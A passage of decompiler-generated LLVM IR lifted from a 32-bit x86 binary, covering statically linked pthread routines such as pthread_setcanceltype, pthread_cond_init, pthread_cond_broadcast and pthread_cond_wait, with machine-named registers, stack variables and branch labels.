  %v4_8059987 = icmp eq i32 %arg2, 0
  store i1 %v4_8059987, i1* %zf.global-to-local, align 1
  store i32 %v1_805997e, i32* @ebx, align 4
  br i1 %v4_8059987, label %dec_label_pc_805999b, label %dec_label_pc_8059990

dec_label_pc_8059990:                             ; preds = %entry
  %v0_8059990 = load i32, i32* @esp, align 4
  %v9_8059990 = icmp eq i32 %v0_8059990, 12
  store i1 %v9_8059990, i1* %zf.global-to-local, align 1
  %v1_8059993 = add i32 %tmp4, 4
  %v2_8059993 = inttoptr i32 %v1_8059993 to i32*
  %v3_8059993 = load i32, i32* %v2_8059993, align 4
  store i32 134584728, i32* %stack_var_-32, align 4
  %v6_8059996 = load i32, i32* %arg1, align 4
  call void @__pseudo_call(i32 %v6_8059996)
  %v0_8059998 = load i32, i32* @esp, align 4
  %v6_8059998 = icmp eq i32 %v0_8059998, -16
  store i1 %v6_8059998, i1* %zf.global-to-local, align 1
  %v0_805999b.pre = load i32, i32* @esi, align 4
  %v0_805999e.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805999b

dec_label_pc_805999b:                             ; preds = %entry, %dec_label_pc_8059990
  %stack_var_-28.0 = phi i32 [ %tmp8, %entry ], [ %v3_8059993, %dec_label_pc_8059990 ]
  %v1_80599a2 = phi i32 [ %v1_805997e, %entry ], [ %v0_805999e.pre, %dec_label_pc_8059990 ]
  %v0_805999b = phi i32 [ %tmp4, %entry ], [ %v0_805999b.pre, %dec_label_pc_8059990 ]
  %v1_805999b = add i32 %v0_805999b, 12
  %v2_805999b = inttoptr i32 %v1_805999b to i32*
  %v3_805999b = load i32, i32* %v2_805999b, align 4
  store i32 %v3_805999b, i32* %eax.global-to-local, align 4
  %v1_805999e = add i32 %v1_80599a2, 66
  %v2_805999e = inttoptr i32 %v1_805999e to i8*
  %v3_805999e = load i8, i8* %v2_805999e, align 1
  %v4_805999e = icmp eq i8 %v3_805999e, 0
  store i1 %v4_805999e, i1* %zf.global-to-local, align 1
  %v2_80599a2 = add i32 %v1_80599a2, 60
  %v3_80599a2 = inttoptr i32 %v2_80599a2 to i32*
  store i32 %v3_805999b, i32* %v3_80599a2, align 4
  %v0_80599a5 = load i32, i32* @esi, align 4
  %v1_80599a5 = add i32 %v0_80599a5, 8
  %v2_80599a5 = inttoptr i32 %v1_80599a5 to i32*
  %v3_80599a5 = load i32, i32* %v2_80599a5, align 4
  store i32 %v3_80599a5, i32* %eax.global-to-local, align 4
  %v1_80599a8 = trunc i32 %v3_80599a5 to i8
  %v2_80599a8 = load i32, i32* @ebx, align 4
  %v3_80599a8 = add i32 %v2_80599a8, 65
  %v4_80599a8 = inttoptr i32 %v3_80599a8 to i8*
  store i8 %v1_80599a8, i8* %v4_80599a8, align 1
  %v0_80599ab = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_80599ab, label %dec_label_pc_80599c3, label %dec_label_pc_80599ad

dec_label_pc_80599ad:                             ; preds = %dec_label_pc_805999b
  %v0_80599ad = load i32, i32* @ebx, align 4
  %v1_80599ad = add i32 %v0_80599ad, 64
  %v2_80599ad = inttoptr i32 %v1_80599ad to i16*
  %v3_80599ad = load i16, i16* %v2_80599ad, align 2
  %v9_80599ad = icmp eq i16 %v3_80599ad, 256
  store i1 %v9_80599ad, i1* %zf.global-to-local, align 1
  %v1_80599b3 = icmp eq i1 %v9_80599ad, false
  br i1 %v1_80599b3, label %dec_label_pc_80599c3, label %dec_label_pc_80599b5

dec_label_pc_80599b5:                             ; preds = %dec_label_pc_80599ad
  store i32 %v0_80599ad, i32* %stack_var_-24, align 4
  store i32 %v15_805997b, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %stack_var_-32, align 4
  %v2_80599be = call i32 @__pthread_do_exit(i32 -1, i32 %v15_805997b)
  store i32 %v2_80599be, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80599c3

dec_label_pc_80599c3:                             ; preds = %dec_label_pc_80599ad, %dec_label_pc_805999b, %dec_label_pc_80599b5
  %stack_var_-28.1 = phi i32 [ %stack_var_-28.0, %dec_label_pc_805999b ], [ %stack_var_-28.0, %dec_label_pc_80599ad ], [ %v15_805997b, %dec_label_pc_80599b5 ]
  %v2_80599c3 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_80599c3, i32* @ecx, align 4
  store i32 %stack_var_-28.1, i32* @ebx, align 4
  %v2_80599c5 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_80599c5, i32* @esi, align 4
  %v0_80599c6 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_80599c6

; uselistorder directives
  uselistorder i1 %v9_80599ad, { 1, 0 }
  uselistorder i32* %eax.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder label %dec_label_pc_80599c3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805999b, { 1, 0 }
}

define i32 @__GI_pthread_setcanceltype(i8 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-12 = alloca i32, align 4
  %tmp14 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp14, i32* %stack_var_-12, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80599ed = load i32, i32* @ebx, align 4
  store i32 %v0_80599ed, i32* %stack_var_-4, align 4
  %v4_80599ed = ptrtoint i32* %stack_var_-4 to i32
  store i32 22, i32* %eax.global-to-local, align 4
  %v4_80599f6 = sext i8 %arg1 to i32
  %v13_80599f6 = icmp eq i8 %arg1, 1
  store i1 %v13_80599f6, i1* %zf.global-to-local, align 1
  store i32 %arg2, i32* @ebx, align 4
  %tmp16 = or i8 %arg1, 1
  %tmp17 = icmp eq i8 %tmp16, 1
  br i1 %tmp17, label %dec_label_pc_8059a01, label %dec_label_pc_8059a37

dec_label_pc_8059a01:                             ; preds = %entry
  %v1_8059a01 = call i32 @thread_self.12(i32 %v0_80599ed)
  store i32 %v1_8059a01, i32* %eax.global-to-local, align 4
  %v1_8059a06 = icmp eq i32 %arg2, 0
  store i1 %v1_8059a06, i1* %zf.global-to-local, align 1
  store i32 %v1_8059a01, i32* %edx.global-to-local, align 4
  br i1 %v1_8059a06, label %dec_label_pc_8059a12, label %dec_label_pc_8059a0c

dec_label_pc_8059a0c:                             ; preds = %dec_label_pc_8059a01
  %v1_8059a0c = add i32 %v1_8059a01, 65
  %v2_8059a0c = inttoptr i32 %v1_8059a0c to i8*
  %v3_8059a0c = load i8, i8* %v2_8059a0c, align 1
  %v4_8059a0c = sext i8 %v3_8059a0c to i32
  store i32 %v4_8059a0c, i32* %eax.global-to-local, align 4
  %v2_8059a10 = inttoptr i32 %arg2 to i32*
  store i32 %v4_8059a0c, i32* %v2_8059a10, align 4
  %v6_8059a12.pre = load i32, i32* %eax.global-to-local, align 4
  %v0_8059a16.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8059a12

dec_label_pc_8059a12:                             ; preds = %dec_label_pc_8059a01, %dec_label_pc_8059a0c
  %v2_8059a1a = phi i32 [ %v1_8059a01, %dec_label_pc_8059a01 ], [ %v0_8059a16.pre, %dec_label_pc_8059a0c ]
  %v6_8059a12 = phi i32 [ %v1_8059a01, %dec_label_pc_8059a01 ], [ %v6_8059a12.pre, %dec_label_pc_8059a0c ]
  %v7_8059a12 = and i32 %v6_8059a12, -256
  %v8_8059a12 = or i32 %v7_8059a12, %v4_80599f6
  store i32 %v8_8059a12, i32* %eax.global-to-local, align 4
  %v1_8059a16 = add i32 %v2_8059a1a, 66
  %v2_8059a16 = inttoptr i32 %v1_8059a16 to i8*
  %v3_8059a16 = load i8, i8* %v2_8059a16, align 1
  %v4_8059a16 = icmp eq i8 %v3_8059a16, 0
  store i1 %v4_8059a16, i1* %zf.global-to-local, align 1
  %v3_8059a1a = add i32 %v2_8059a1a, 65
  %v4_8059a1a = inttoptr i32 %v3_8059a1a to i8*
  store i8 %arg1, i8* %v4_8059a1a, align 1
  %v0_8059a1d = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_8059a1d, label %dec_label_pc_8059a35, label %dec_label_pc_8059a1f

dec_label_pc_8059a1f:                             ; preds = %dec_label_pc_8059a12
  %v0_8059a1f = load i32, i32* %edx.global-to-local, align 4
  %v1_8059a1f = add i32 %v0_8059a1f, 64
  %v2_8059a1f = inttoptr i32 %v1_8059a1f to i16*
  %v3_8059a1f = load i16, i16* %v2_8059a1f, align 2
  %v9_8059a1f = icmp eq i16 %v3_8059a1f, 256
  store i1 %v9_8059a1f, i1* %zf.global-to-local, align 1
  %v1_8059a25 = icmp eq i1 %v9_8059a1f, false
  br i1 %v1_8059a25, label %dec_label_pc_8059a35, label %dec_label_pc_8059a27

dec_label_pc_8059a27:                             ; preds = %dec_label_pc_8059a1f
  store i32 %v4_80599ed, i32* %eax.global-to-local, align 4
  %v2_8059a30 = call i32 @__pthread_do_exit(i32 -1, i32 %v4_80599ed)
  store i32 %v2_8059a30, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8059a35

dec_label_pc_8059a35:                             ; preds = %dec_label_pc_8059a1f, %dec_label_pc_8059a12, %dec_label_pc_8059a27
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_8059a37.pre = load i32, i32* %stack_var_-12, align 4
  %v2_8059a39.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8059a37

dec_label_pc_8059a37:                             ; preds = %entry, %dec_label_pc_8059a35
  %v2_8059a39 = phi i32 [ %v0_80599ed, %entry ], [ %v2_8059a39.pre, %dec_label_pc_8059a35 ]
  %v2_8059a37 = phi i32 [ %tmp14, %entry ], [ %v2_8059a37.pre, %dec_label_pc_8059a35 ]
  %v0_8059a3a = phi i32 [ 22, %entry ], [ 0, %dec_label_pc_8059a35 ]
  store i32 %v2_8059a37, i32* @edx, align 4
  store i32 %v2_8059a39, i32* @ebx, align 4
  ret i32 %v0_8059a3a

; uselistorder directives
  uselistorder i1 %v9_8059a1f, { 1, 0 }
  uselistorder i32 %v1_8059a01, { 1, 0, 2, 3, 4 }
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
  uselistorder i32* %edx.global-to-local, { 1, 0, 2 }
  uselistorder i32 (i32)* @thread_self.12, { 0, 3, 4, 5, 2, 1 }
  uselistorder i32 %arg2, { 1, 2, 0 }
  uselistorder i8 %arg1, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_8059a37, { 1, 0 }
  uselistorder label %dec_label_pc_8059a35, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8059a12, { 1, 0 }
}

define i32 @enqueue.13() local_unnamed_addr {
entry:
  %v0_8059b3d = load i32, i32* @edx, align 4
  %v1_8059b3d = add i32 %v0_8059b3d, 24
  %v2_8059b3d = inttoptr i32 %v1_8059b3d to i32*
  %v3_8059b3d = load i32, i32* %v2_8059b3d, align 4
  store i32 %v3_8059b3d, i32* @ebx, align 4
  call void @llvm.trap()
  unreachable
}

define i32 @pthread_cond_init(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp1 = ptrtoint i32* %arg1 to i32
  store i32 %tmp1, i32* %eax.global-to-local, align 4
  store i32 0, i32* %arg1, align 4
  %v1_8059b8c = add i32 %tmp1, 4
  %v2_8059b8c = inttoptr i32 %v1_8059b8c to i32*
  store i32 0, i32* %v2_8059b8c, align 4
  %v0_8059b93 = load i32, i32* %eax.global-to-local, align 4
  %v1_8059b93 = add i32 %v0_8059b93, 8
  %v2_8059b93 = inttoptr i32 %v1_8059b93 to i32*
  store i32 0, i32* %v2_8059b93, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  ret i32 0
}

define i32 @__pthread_set_own_extricate_if.15(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_8059bd6 = load i32, i32* @esi, align 4
  %v0_8059bd7 = load i32, i32* @edx, align 4
  store i32 %v0_8059bd7, i32* @esi, align 4
  %v0_8059bd9 = load i32, i32* @ebx, align 4
  %v0_8059bda = load i32, i32* @eax, align 4
  store i32 %v0_8059bda, i32* @ebx, align 4
  %v1_8059bdf = icmp eq i32 %v0_8059bd7, 0
  br i1 %v1_8059bdf, label %dec_label_pc_8059bff, label %dec_label_pc_8059be3

dec_label_pc_8059be3:                             ; preds = %entry
  %v1_8059be3 = add i32 %v0_8059bda, 64
  %v2_8059be3 = inttoptr i32 %v1_8059be3 to i8*
  %v3_8059be3 = load i8, i8* %v2_8059be3, align 1
  %v4_8059be3 = icmp eq i8 %v3_8059be3, 0
  %v1_8059be7 = icmp eq i1 %v4_8059be3, false
  br i1 %v1_8059be7, label %dec_label_pc_8059c0d, label %dec_label_pc_8059bf5.thread

dec_label_pc_8059bf5.thread:                      ; preds = %dec_label_pc_8059be3
  %v2_8059bf77 = add i32 %v0_8059bda, 444
  %v3_8059bf78 = inttoptr i32 %v2_8059bf77 to i32*
  store i32 %v0_8059bd7, i32* %v3_8059bf78, align 4
  br label %dec_label_pc_8059c0d

dec_label_pc_8059bff:                             ; preds = %entry
  %v1_8059beb = add i32 %v0_8059bda, 28
  %v2_8059beb = inttoptr i32 %v1_8059beb to i32*
  %v3_8059beb = load i32, i32* %v2_8059beb, align 4
  store i32 %v3_8059beb, i32* @eax, align 4
  store i32 %v0_8059bda, i32* @edx, align 4
  %v1_8059bf0 = call i32 @__pthread_lock(i32 %v0_8059bd9)
  %v1_8059bf7.pre = load i32, i32* @ebx, align 4
  %v2_8059bf7 = add i32 %v1_8059bf7.pre, 444
  %v3_8059bf7 = inttoptr i32 %v2_8059bf7 to i32*
  store i32 0, i32* %v3_8059bf7, align 4
  %v0_8059c02 = load i32, i32* @ebx, align 4
  %v1_8059c02 = add i32 %v0_8059c02, 28
  %v2_8059c02 = inttoptr i32 %v1_8059c02 to i32*
  %v3_8059c02 = load i32, i32* %v2_8059c02, align 4
  %v1_8059c05 = inttoptr i32 %v3_8059c02 to i32*
  %v2_8059c05 = call i32 @__pthread_unlock(i32* %v1_8059c05)
  br label %dec_label_pc_8059c0d

dec_label_pc_8059c0d:                             ; preds = %dec_label_pc_8059bf5.thread, %dec_label_pc_8059be3, %dec_label_pc_8059bff
  %v2_8059c0d = load i32, i32* %stack_var_-12, align 4
  store i32 %v0_8059bd9, i32* @ebx, align 4
  store i32 %v0_8059bd6, i32* @esi, align 4
  ret i32 %v2_8059c0d

; uselistorder directives
  uselistorder i32 %v0_8059bda, { 1, 2, 0, 3, 4 }
  uselistorder i32 444, { 1, 0 }
  uselistorder label %dec_label_pc_8059c0d, { 2, 0, 1 }
}

define i32 @restart.16() local_unnamed_addr {
entry:
  %v0_8059c14 = load i32, i32* @eax, align 4
  %v1_8059c15 = call i32 @__pthread_restart_new(i32 %v0_8059c14)
  ret i32 %v1_8059c15

; uselistorder directives
  uselistorder i32 (i32)* @__pthread_restart_new, { 2, 0, 1 }
}

define i32 @pthread_cond_broadcast(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @edx, align 4
  %v0_8059c21 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  store i32 %arg1, i32* @eax, align 4
  %v1_8059c2b = call i32 @__pthread_lock(i32 %v0_8059c21)
  %v0_8059c33 = load i32, i32* @ebx, align 4
  %v1_8059c33 = add i32 %v0_8059c33, 8
  %v2_8059c33 = inttoptr i32 %v1_8059c33 to i32*
  %v3_8059c33 = load i32, i32* %v2_8059c33, align 4
  store i32 %v3_8059c33, i32* @esi, align 4
  store i32 0, i32* %v2_8059c33, align 4
  %v0_8059c3d = load i32, i32* @ebx, align 4
  %v1_8059c3e = inttoptr i32 %v0_8059c3d to i32*
  %v2_8059c3e = call i32 @__pthread_unlock(i32* %v1_8059c3e)
  %v0_8059c621 = load i32, i32* @esi, align 4
  %v1_8059c622 = icmp eq i32 %v0_8059c621, 0
  %v1_8059c649 = icmp eq i1 %v1_8059c622, false
  br i1 %v1_8059c649, label %dec_label_pc_8059c48, label %dec_label_pc_8059c66

dec_label_pc_8059c48:                             ; preds = %entry, %dec_label_pc_8059c48
  %v0_8059c48 = phi i32 [ %v0_8059c62, %dec_label_pc_8059c48 ], [ %v0_8059c621, %entry ]
  %v1_8059c48 = add i32 %v0_8059c48, 8
  %v2_8059c48 = inttoptr i32 %v1_8059c48 to i32*
  %v3_8059c48 = load i32, i32* %v2_8059c48, align 4
  store i32 %v3_8059c48, i32* @ebx, align 4
  %v1_8059c4b = add i32 %v0_8059c48, 441
  %v2_8059c4b = inttoptr i32 %v1_8059c4b to i8*
  store i8 1, i8* %v2_8059c4b, align 1
  %v0_8059c52 = load i32, i32* @esi, align 4
  %v1_8059c52 = add i32 %v0_8059c52, 8
  %v2_8059c52 = inttoptr i32 %v1_8059c52 to i32*
  store i32 0, i32* %v2_8059c52, align 4
  %v0_8059c59 = load i32, i32* @esi, align 4
  store i32 %v0_8059c59, i32* @eax, align 4
  %v0_8059c5b = load i32, i32* @ebx, align 4
  store i32 %v0_8059c5b, i32* @esi, align 4
  %v0_8059c5d = call i32 @restart.16()
  %v0_8059c62 = load i32, i32* @esi, align 4
  %v1_8059c62 = icmp eq i32 %v0_8059c62, 0
  %v1_8059c64 = icmp eq i1 %v1_8059c62, false
  br i1 %v1_8059c64, label %dec_label_pc_8059c48, label %dec_label_pc_8059c66

dec_label_pc_8059c66:                             ; preds = %dec_label_pc_8059c48, %entry
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_8059c62, { 1, 0 }
  uselistorder i32 %v0_8059c48, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8059c48, { 1, 0 }
}

define i32 @thread_self.17(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_2096672 = alloca i32, align 4
  %v0_8059c6c = load i32, i32* @esp, align 4
  %v1_8059c6c = load i32, i32* @global_var_807b620.613, align 32
  %v7_8059c6c = icmp ult i32 %v0_8059c6c, %v1_8059c6c
  %v1_8059c79 = icmp eq i1 %v7_8059c6c, false
  br i1 %v1_8059c79, label %dec_label_pc_8059caa, label %dec_label_pc_8059c7b

dec_label_pc_8059c7b:                             ; preds = %entry
  %v1_8059c7b = load i32, i32* @global_var_807b624.614, align 4
  %v7_8059c7b = icmp ult i32 %v0_8059c6c, %v1_8059c7b
  br i1 %v7_8059c7b, label %dec_label_pc_8059c90, label %dec_label_pc_8059c83

dec_label_pc_8059c83:                             ; preds = %dec_label_pc_8059c7b
  %v1_8059c83 = load i32, i32* @global_var_807b628.615, align 8
  %v7_8059c83 = icmp ult i32 %v0_8059c6c, %v1_8059c83
  br i1 %v7_8059c83, label %dec_label_pc_8059caa, label %dec_label_pc_8059c90

dec_label_pc_8059c90:                             ; preds = %dec_label_pc_8059c83, %dec_label_pc_8059c7b
  %v0_8059c90 = load i32, i32* @global_var_807f100.617, align 256
  %v1_8059c90 = icmp eq i32 %v0_8059c90, 0
  br i1 %v1_8059c90, label %dec_label_pc_8059c9e, label %dec_label_pc_8059c99

dec_label_pc_8059c99:                             ; preds = %dec_label_pc_8059c90
  %v0_8059c99 = call i32 @__pthread_find_self()
  br label %dec_label_pc_8059c9e

dec_label_pc_8059c9e:                             ; preds = %dec_label_pc_8059c90, %dec_label_pc_8059c99
  %v2_8059ca4 = ptrtoint i32* %stack_var_2096672 to i32
  br label %dec_label_pc_8059caa

dec_label_pc_8059caa:                             ; preds = %dec_label_pc_8059c83, %entry, %dec_label_pc_8059c9e
  %v0_8059caa = phi i32 [ ptrtoint (i32* @global_var_8074aa0.616 to i32), %dec_label_pc_8059c83 ], [ ptrtoint (i32* @global_var_80748c0 to i32), %entry ], [ %v2_8059ca4, %dec_label_pc_8059c9e ]
  ret i32 %v0_8059caa

; uselistorder directives
  uselistorder label %dec_label_pc_8059caa, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8059c9e, { 1, 0 }
}

define i32 @suspend.18() local_unnamed_addr {
entry:
  %v0_8059cea = load i32, i32* @eax, align 4
  %v1_8059ceb = call i32 @__pthread_wait_for_restart_signal(i32 %v0_8059cea)
  ret i32 %v1_8059ceb

; uselistorder directives
  uselistorder i32 (i32)* @__pthread_wait_for_restart_signal, { 2, 0, 1 }
}

define i32 @__GI_pthread_cond_wait(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8059ea9 = load i32, i32* @edi, align 4
  %v0_8059eaa = load i32, i32* @esi, align 4
  %v0_8059eab = load i32, i32* @ebx, align 4
  store i32 %v0_8059eab, i32* %stack_var_-16, align 4
  %v4_8059eab = ptrtoint i32* %stack_var_-16 to i32
  %v2_8059eaf = call i32 @thread_self.17(i32 %v0_8059eab, i32 %v0_8059eaa)
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg1, i32* @esi, align 4
  %v1_8059ebd = add i32 %arg2, 12
  %v2_8059ebd = inttoptr i32 %v1_8059ebd to i32*
  %v3_8059ebd = load i32, i32* %v2_8059ebd, align 4
  %v9_8059ec0 = icmp eq i32 %v3_8059ebd, 3
  br i1 %v9_8059ec0, label %dec_label_pc_8059eda, label %dec_label_pc_8059ec5

dec_label_pc_8059ec5:                             ; preds = %entry
  %v1_8059ec5 = icmp eq i32 %v3_8059ebd, 0
  br i1 %v1_8059ec5, label %dec_label_pc_8059eda, label %dec_label_pc_8059ec9

dec_label_pc_8059ec9:                             ; preds = %dec_label_pc_8059ec5
  %v1_8059ed1 = add i32 %arg2, 8
  %v2_8059ed1 = inttoptr i32 %v1_8059ed1 to i32*
  %v3_8059ed1 = load i32, i32* %v2_8059ed1, align 4
  %v15_8059ed1 = icmp eq i32 %v3_8059ed1, %v2_8059eaf
  %v1_8059ed4 = icmp eq i1 %v15_8059ed1, false
  br i1 %v1_8059ed4, label %dec_label_pc_8059fda, label %dec_label_pc_8059eda

dec_label_pc_8059eda:                             ; preds = %dec_label_pc_8059ec9, %dec_label_pc_8059ec5, %entry
  %v2_8059edd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8059edd, i32* @edx, align 4
  store i32 %arg1, i32* %stack_var_-28, align 4
  %v1_8059eea = add i32 %v2_8059eaf, 441
  %v2_8059eea = inttoptr i32 %v1_8059eea to i8*
  store i8 0, i8* %v2_8059eea, align 1
  store i32 %v2_8059eaf, i32* @eax, align 4
  %v0_8059ef4 = load i32, i32* %stack_var_-28, align 4
  %v2_8059ef4 = call i32 @__pthread_set_own_extricate_if.15(i32 %v0_8059ef4, i32 134585515)
  store i32 %v2_8059eaf, i32* @edx, align 4
  %v0_8059efc = load i32, i32* @esi, align 4
  store i32 %v0_8059efc, i32* @eax, align 4
  %v1_8059efe = call i32 @__pthread_lock(i32 134585515)
  %v1_8059f06 = add i32 %v2_8059eaf, 66
  %v2_8059f06 = inttoptr i32 %v1_8059f06 to i8*
  %v3_8059f06 = load i8, i8* %v2_8059f06, align 1
  %v4_8059f06 = icmp eq i8 %v3_8059f06, 0
  br i1 %v4_8059f06, label %dec_label_pc_8059f1a, label %dec_label_pc_8059f0c

dec_label_pc_8059f0c:                             ; preds = %dec_label_pc_8059eda
  store i32 1, i32* @ebx, align 4
  %v1_8059f14 = add i32 %v2_8059eaf, 64
  %v2_8059f14 = inttoptr i32 %v1_8059f14 to i8*
  %v3_8059f14 = load i8, i8* %v2_8059f14, align 1
  %v4_8059f14 = icmp eq i8 %v3_8059f14, 0
  br i1 %v4_8059f14, label %dec_label_pc_8059f27, label %dec_label_pc_8059f1a

dec_label_pc_8059f1a:                             ; preds = %dec_label_pc_8059f0c, %dec_label_pc_8059eda
  store i32 %v2_8059eaf, i32* @edx, align 4
  %v0_8059f22 = call i32 @enqueue.13()
  br label %dec_label_pc_8059f27

dec_label_pc_8059f27:                             ; preds = %dec_label_pc_8059f0c, %dec_label_pc_8059f1a
  %v0_8059f2a = load i32, i32* @esi, align 4
  store i32 %v0_8059f2a, i32* %stack_var_-60, align 4
  %v1_8059f2b = inttoptr i32 %v0_8059f2a to i32*
  %v2_8059f2b = call i32 @__pthread_unlock(i32* %v1_8059f2b)
  %v0_8059f33 = load i32, i32* @ebx, align 4
  %v1_8059f33 = icmp eq i32 %v0_8059f33, 0
  br i1 %v1_8059f33, label %dec_label_pc_8059f45, label %dec_label_pc_8059f37

dec_label_pc_8059f37:                             ; preds = %dec_label_pc_8059f27
  store i32 %v2_8059eaf, i32* @eax, align 4
  store i32 0, i32* @edx, align 4
  %v0_8059f3c = load i32, i32* %stack_var_-60, align 4
  %v1_8059f3c = load i32, i32* %stack_var_-56, align 4
  %v2_8059f3c = call i32 @__pthread_set_own_extricate_if.15(i32 %v0_8059f3c, i32 %v1_8059f3c)
  br label %dec_label_pc_8059fb3

dec_label_pc_8059f45:                             ; preds = %dec_label_pc_8059f27
  store i32 0, i32* @ebx, align 4
  %v0_8059f4a = load i32, i32* @edi, align 4
  store i32 %v0_8059f4a, i32* %stack_var_-60, align 4
  %v1_8059f4b = call i32 @pthread_mutex_unlock(i32 %v0_8059f4a)
  %v1_8059f6a = add i32 %v2_8059eaf, 440
  %v2_8059f6a = inttoptr i32 %v1_8059f6a to i8*
  %v1_8059f76 = add i32 %v2_8059eaf, 64
  %v2_8059f76 = inttoptr i32 %v1_8059f76 to i8*
  store i32 %v2_8059eaf, i32* @eax, align 4
  %v0_8059f5616 = call i32 @suspend.18()
  %v3_8059f5e17 = load i8, i8* %v2_8059eea, align 1
  %v4_8059f5e18 = icmp eq i8 %v3_8059f5e17, 0
  %v1_8059f6520 = icmp eq i1 %v4_8059f5e18, false
  br i1 %v1_8059f6520, label %dec_label_pc_8059f7f, label %dec_label_pc_8059f67

dec_label_pc_8059f67:                             ; preds = %dec_label_pc_8059f45, %dec_label_pc_8059f7c
  %v3_8059f6a = load i8, i8* %v2_8059f6a, align 1
  %v4_8059f6a = icmp eq i8 %v3_8059f6a, 0
  br i1 %v4_8059f6a, label %dec_label_pc_8059f7c, label %dec_label_pc_8059f73

dec_label_pc_8059f73:                             ; preds = %dec_label_pc_8059f67
  %v3_8059f76 = load i8, i8* %v2_8059f76, align 1
  %v4_8059f76 = icmp eq i8 %v3_8059f76, 0
  br i1 %v4_8059f76, label %dec_label_pc_8059f7f, label %dec_label_pc_8059f7c

dec_label_pc_8059f7c:                             ; preds = %dec_label_pc_8059f73, %dec_label_pc_8059f67
  %v0_8059f7c = load i32, i32* @ebx, align 4
  %v1_8059f7c = add i32 %v0_8059f7c, 1
  store i32 %v1_8059f7c, i32* @ebx, align 4
  store i32 %v2_8059eaf, i32* @eax, align 4
  %v0_8059f56 = call i32 @suspend.18()
  %v3_8059f5e = load i8, i8* %v2_8059eea, align 1
  %v4_8059f5e = icmp eq i8 %v3_8059f5e, 0
  %v1_8059f65 = icmp eq i1 %v4_8059f5e, false
  br i1 %v1_8059f65, label %dec_label_pc_8059f7f, label %dec_label_pc_8059f67

dec_label_pc_8059f7f:                             ; preds = %dec_label_pc_8059f7c, %dec_label_pc_8059f73, %dec_label_pc_8059f45
  store i32 %v2_8059eaf, i32* @eax, align 4
  store i32 0, i32* @edx, align 4
  %v0_8059f84 = load i32, i32* %stack_var_-60, align 4
  %v1_8059f84 = load i32, i32* %stack_var_-56, align 4
  %v2_8059f84 = call i32 @__pthread_set_own_extricate_if.15(i32 %v0_8059f84, i32 %v1_8059f84)
  %v3_8059f8c = load i8, i8* %v2_8059f6a, align 1
  %v4_8059f8c = icmp eq i8 %v3_8059f8c, 0
  br i1 %v4_8059f8c, label %dec_label_pc_8059fc6, label %dec_label_pc_8059f95

dec_label_pc_8059f95:                             ; preds = %dec_label_pc_8059f7f
  %v3_8059f98 = load i8, i8* %v2_8059f76, align 1
  %v4_8059f98 = icmp eq i8 %v3_8059f98, 0
  %v1_8059f9c = icmp eq i1 %v4_8059f98, false
  br i1 %v1_8059f9c, label %dec_label_pc_8059fc6, label %dec_label_pc_8059f9e

dec_label_pc_8059f9e:                             ; preds = %dec_label_pc_8059f95
  store i8 0, i8* %v2_8059f6a, align 1
  %v0_8059fab = load i32, i32* @edi, align 4
  store i32 %v0_8059fab, i32* %stack_var_-60, align 4
  %v1_8059fac = call i32 @pthread_mutex_lock(i32 %v0_8059fab)
  store i32 %v0_8059fab, i32* @ebx, align 4
  %v2_8059fb2 = load i32, i32* %stack_var_-56, align 4
  store i32 %v2_8059fb2, i32* @esi, align 4
  br label %dec_label_pc_8059fb3

dec_label_pc_8059fb3:                             ; preds = %dec_label_pc_8059f37, %dec_label_pc_8059f9e
  store i32 %v4_8059eab, i32* %stack_var_-56, align 4
  store i32 -1, i32* %stack_var_-60, align 4
  %v2_8059fb9 = call i32 @__pthread_do_exit(i32 -1, i32 %v4_8059eab)
  br label %dec_label_pc_8059fbe

dec_label_pc_8059fbe:                             ; preds = %dec_label_pc_8059fc6, %dec_label_pc_8059fb3
  store i32 %v2_8059eaf, i32* @eax, align 4
  %v0_8059fc1 = call i32 @restart.16()
  br label %dec_label_pc_8059fc6

dec_label_pc_8059fc6:                             ; preds = %dec_label_pc_8059f95, %dec_label_pc_8059f7f, %dec_label_pc_8059fbe
  %v0_8059fc6 = load i32, i32* @ebx, align 4
  %v1_8059fc6 = add i32 %v0_8059fc6, -1
  store i32 %v1_8059fc6, i32* @ebx, align 4
  %v10_8059fc7 = icmp eq i32 %v0_8059fc6, 0
  %v1_8059fca = icmp eq i1 %v10_8059fc7, false
